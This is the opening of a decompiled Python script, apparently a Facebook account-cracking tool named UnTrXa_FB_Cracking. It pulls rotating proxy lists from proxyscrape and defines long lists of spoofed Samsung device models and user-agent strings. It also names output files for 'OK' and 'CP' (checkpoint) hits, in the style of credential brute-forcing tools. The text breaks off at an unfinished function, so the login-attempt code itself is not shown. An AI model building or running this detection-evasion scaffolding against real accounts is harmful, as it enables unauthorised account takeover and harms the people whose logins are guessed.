###DECOMPILED BY MR.RIKI
import requests, bs4, json, os, sys, random, datetime, time, re
import urllib3, rich, base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text as tekz
from time import localtime as lt
import platform
from rich.columns import Columns
from rich.progress import TimeElapsedColumn
import shutil, platform, subprocess, logging
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Event
from time import sleep as jeda
from datetime import date
import calendar      
from requests.exceptions import ChunkedEncodingError
from requests.exceptions import ConnectionError
pretty.install()
CON=sol()
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820",'SM-S908B','SM-G960U1','SC-04J','SC-51B','SM-S9080','SM-M536S','SM-G996W','SM-E426S','SM-G975F','SM-A207F','SM-A013G','SM-A145R','SM-S901B','SM-A145P','SM-N975F','SM-M136B','SM-A035M','SM-A135M','SM-A536B','SM-M115F','SM-M115F','SM-M115M','SM-M115M','SM-M107F','SM-M107G','SM-M107Y','SM-M107M','SM-M105F','SM-M105G','SM-M105Y','SM-M105M','SM-M127F','SM-M135F','SM-M135F','SM-M136B','SM-M136B','SM-M205F','SM-M205FN','SM-M205G','SM-M205M','SM-M205N','GT-N7000','GT-I9220','SVC-E160L','SVC-E160S','SM-J701F','SM-J701F','SM-J701M','SM-J701MT','SM-J710FN','SM-J710F','SM-J710H','SM-J710M','SM-J710GN','SM-J710MN','SM-J710K','SM-J7108','SM-J710FQ','SM-J737F','SM-J737V','SM-J737T','SM-J737A','SM-J737P','SM-J737T1','SM-J737U','SM-J737S','SM-J730F','SM-J730FM','SM-S727VL','SM-J730K','SM-N981B','SM-N981B','SM-N981U','SM-N981U1','SM-N981W','SM-N9810','SM-N981N','SM-J610F','SM-J610F','SM-J610G','SM-J610FN','SM-N980F','SM-N980F','SM-N770F','SM-N770F','SM-N770F','SM-N975F','SM-N975U','SM-N9750','SM-N975U1','SM-N975W','SM-N975N','SM-N975X','SCV45','SM-N971U','SM-N971N', "SM-A426B", "SM-A426B/DS", "SM-A4260", "SM-A426U", "SM-A426U1", "SM-A426N", "SM-A736B", "SM-A736B/DS", "SM-A336E", "SM-A336B", "SM-A336B/DS", "SM-A336B/DSN", "SM-A336E/DS", "SM-A336M", "SM-A326B", "SM-A326B/DS", "SM-A326BR/DS", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-N9150", "SM-N915A", "SM-N915D", "SM-N915F", "SM-N915FY", "SM-N915G", "SM-N915K", "SM-N915L", "SM-N915P", "SM-N915R4", "SM-N915S", "SM-N915T", "SM-N915V", "SM-N915W8", "SM-N915X", "SC-01G"])
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip install requests')
        os.system('python UnTrXa_FB_Cracking.py')
except:pass
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.UnTrXa-Proxy.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.UnTrXa-Proxy.txt','r').read().splitlines()
ugen=[]
res = requests.get("https://ipinfo.io/")
data = res.json()
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
days = datetime.datetime.now().day
months = dic[(str(datetime.datetime.now().month))]
years = datetime.datetime.now().year
okc = 'OK-'+str(days)+'-'+str(months)+'-'+str(years)+'.txt'
cpc = 'CP-'+str(days)+'-'+str(months)+'-'+str(years)+'.txt'
date = str(days)+'/'+str(months)+'/'+str(years)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
logo=("""\033[1;31;40m                          
             #######                    
         ###########                    
       ############                     
     ######   ####                      
    ####     ##### #######              
   ###       ############# ####         
  ###       #####     #### ####      #  
  ##        #####         #####      #  
  ##       ########      #####       #  
 ##        ###################       ## 
 ##       ###################        ## 
  #       #####      ########       ##  
  #      #####          ####        ##  
  #      #### ####     #####       ###  
         #### #############       ###   
              #############     ####    
                      ####   ######     
                     ############       
                    ###########         
                    #######             
\033[1;32;40m                                       
╔╗ ╔╗    ╔════╗                     ╔╗  ╔╗     ╔═╗╔═╗
║║ ║║    ║╔╗╔╗║                     ║║  ║║     ╚╗╚╝╔╝
║║ ║║╔═╗ ╚╝║║╚╝╔═╗╔══╗ ╔══╗╔══╗╔══╗ ║╚═╗║║ ╔══╗ ╚╗╔╝ 
║║ ║║║╔╗╗  ║║  ║╔╝╚ ╗║ ║╔═╝║╔╗║╚ ╗║ ║╔╗║║║ ║╔╗║ ╔╝╚╗ 
║╚═╝║║║║║ ╔╝╚╗ ║║ ║╚╝╚╗║╚═╗║║═╣║╚╝╚╗║╚╝║║╚╗║║═╣╔╝╔╗╚╗
╚═══╝╚╝╚╝ ╚══╝ ╚╝ ╚═══╝╚══╝╚══╝╚═══╝╚══╝╚═╝╚══╝╚═╝╚═╝
""")
def linex():
        print('\033[1;37m-----------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
ugen2=["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
"Autoplius.lt/6.6.0 Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EmbeddedBrowser DeviceUID:",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; jhs561 Build/GIADA.eng.zc.20200922.153858; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ART-L29; HMSCore 6.6.0.311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; moto g stylus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 RuxitSynthetic/1.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 RuxitSynthetic/1.0",
"Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/183.0.0.36.93;FBBV/123940704;FBDV/iPad4,7;FBMD/iPad;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/;FBID/tablet;FBLC/es_LA;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.0 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.1 Safari/605.1.15",
"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
"Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_9; like Mac OS X) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/49.0.1455.201 Mobile Safari/603.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_8; like Mac OS X) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/51.0.1116.123 Mobile Safari/600.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5; like Mac OS X) AppleWebKit/600.43 (KHTML, like Gecko)  Chrome/51.0.2458.138 Mobile Safari/602.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_0; like Mac OS X) AppleWebKit/537.3 (KHTML, like Gecko)  Chrome/52.0.2335.107 Mobile Safari/603.5",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_7; like Mac OS X) AppleWebKit/602.34 (KHTML, like Gecko)  Chrome/54.0.1280.327 Mobile Safari/601.2",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_6_7; like Mac OS X) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/48.0.1600.178 Mobile Safari/602.4",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/47.0.1741.400 Mobile Safari/601.4",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.123 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.53 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/218.0.456502374 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/22.7.6.401.10 YaApp_iOS/2207.6 YaApp_iOS_Browser/2207.6 Safari/604.1 SA/3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312j [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5339d [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1 OPX/1.5.2",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17.0 like Mac OS X) AppleWebKit/(KHTML, like Gecko) Version/16.4 Mobile/Safari",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1"]
ugen=["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_5; like Mac OS X) AppleWebKit/535.37 (KHTML, like Gecko)  Chrome/55.0.1438.376 Mobile Safari/603.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_3; like Mac OS X) AppleWebKit/534.44 (KHTML, like Gecko)  Chrome/51.0.2055.387 Mobile Safari/602.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_8; like Mac OS X) AppleWebKit/601.9 (KHTML, like Gecko)  Chrome/52.0.2927.225 Mobile Safari/535.9",
"Mozilla/5.0(Windows;U;WindowsNT9.1;en-US;rv:12.9.1.11)Gecko/20100821Firefox/70",
"Mozilla/5.0(WindowsNT10.0;WOW64;rv:45.66.18)Gecko/20177177Firefox/45.66.18",
"Mozilla/5.0(WindowsNT10.0;WOW64;rv:69.2.1)Gecko/20100101Firefox/69.2",
"Mozilla/5.0(WindowsNT10.0;WOW64;rv:77.0)Gecko/20100101Firefox/77.0",
"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Firefox/58.0.1",
"Mozilla/5.0(WindowsNT5.0;WindowsNT5.1;WindowsNT6.0;WindowsNT6.1;Linux;es-VE;rv:52.9.0)Gecko/20100101Firefox/52.9.0",
"Mozilla/5.0(X11;Linux;rv:74.0)Gecko/20100101Firefox/74.0",
"Mozilla/5.0(X11;Linuxi586;rv:31.0)Gecko/20100101Firefox/31.0",
"Mozilla/5.0(X11;Linuxi586;rv:63.0)Gecko/20100101Firefox/63.0",
"Mozilla/5.0(X11;Linuxi686;rv:21.0)Gecko/20100101Firefox/21.0",
"Mozilla/5.0(X11;Linuxi686;rv:64.0)Gecko/20100101Firefox/64.0",
"Mozilla/5.0(X11;Linuxppc64le;rv:75.0)Gecko/20100101Firefox/75.0",
"Mozilla/5.0(X11;Linuxx86_64;rv:28.0)Gecko/20100101Firefox/28.0",
"Mozilla/5.0(X11;NetBSDamd64;rv:16.0)Gecko/20121102Firefox/16.0",
"Mozilla/5.0(X11;OpenBSDamd64;rv:28.0)Gecko/20100101Firefox/28.0",
"Mozilla/5.0(X11;OpenBSDi386;rv:72.0)Gecko/20100101Firefox/72.0",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.16)Gecko/20120421Firefox/11.0",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.16)Gecko/20120421GeckoFirefox/11.0",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9a1)Gecko/20060814Firefox/51.0",
"Mozilla/5.0(X11;Ubuntu;Linuxarmv7l;rv:17.0)Gecko/20100101Firefox/17.0",
"Mozilla/5.0(X11;Ubuntu;Linuxi686;rv:14.0)Gecko/20100101Firefox/14.0.1",
"Mozilla/5.0(X11;Ubuntu;Linuxi686;rv:15.0)Gecko/20100101Firefox/15.0.1",
"Mozilla/5.0(X11;Ubuntu;Linuxi686;rv:52.0)Gecko/20100101Firefox/52.0",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:17.0)Gecko/20100101Firefox/17.0.6",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:21.0)Gecko/20100101Firefox/21.0",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:21.0)Gecko/20130331Firefox/21.0",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:24.0)Gecko/20100101Firefox/24.0",
"Mozilla/5.0(X11;Ubuntui686;rv:52.0)Gecko/20100101Firefox/52.0",
"Mozilla/5.0(iPad;U;CPUiPhoneOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7B314Safari/123",
"Mozilla/5.0(iPad;U;CPUiPhoneOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7B314Safari/531.21.10gin_lib.cc",
"Mozilla/5.0(iPhone;U;CPUOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7B334bSafari/531.21.10",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_1likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8B117Safari/6531.22.7",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_1likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8B5097dSafari/6531.22.7",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_2_1likeMacOSX;en-us)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_2_1likeMacOSX;nb-no)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148aSafari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3_1likeMacOSX;zh-tw)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8G4Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3likeMacOSX;en-gb)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8F190Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3likeMacOSX;en-us)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8F190Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3likeMacOSX;pl-pl)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8F190Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;fr;CPUiPhoneOS4_2_1likeMacOSX;fr)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148aSafari/6533.18.5",
"Mozilla/5.0(iPhone;U;ru;CPUiPhoneOS4_2_1likeMacOSX;fr)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148aSafari/6533.18.5",
"Mozilla/5.0(iPhone;U;ru;CPUiPhoneOS4_2_1likeMacOSX;ru)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148aSafari/6533.18.5",
"Mozilla/5.0(iPhoneSimulator;U;CPUiPhoneOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7D11Safari/531.21.10",
"Mozilla/5.0(iPod;U;CPUiPhoneOS4_2_1likeMacOSX;en-us)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPod;U;CPUiPhoneOS4_3_1likeMacOSX;zh-cn)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8G4Safari/6533.18.5",
"Mozilla/5.0(iPod;U;CPUiPhoneOS4_3_3likeMacOSX;ja-jp)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8J2Safari/6533.18.5"]
twf=[]
pcp=[]
tp=0
id=[]
tokenku=[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
Z = "\x1b[0;90m"     
M = "\x1b[38;5;196m" 
H = "\x1b[38;5;46m"  
K = "\x1b[38;5;226m" 
B = "\x1b[38;5;44m"  
U = "\x1b[0;95m"     
O = "\x1b[0;96m"     
P = "\x1b[38;5;231m" 
J = "\x1b[38;5;208m" 
A = "\x1b[38;5;248m" 
Z2 = "[#000000]" 
M2 = "[#FF0000]" 
H2 = "[#00FF00]" 
K2 = "[#FFFF00]" 
B2 = "[#00C8FF]" 
U2 = "[#AF00FF]" 
N2 = "[#FF00FF]" 
O2 = "[#00FFFF]" 
P2 = "[#FFFFFF]" 
J2 = "[#FF8F00]" 
A2 = "[#AAAAAA]" 
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
A="\033[0m"
lr="\033[0;91m"
lg="\033[0;9m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
def animation(u):
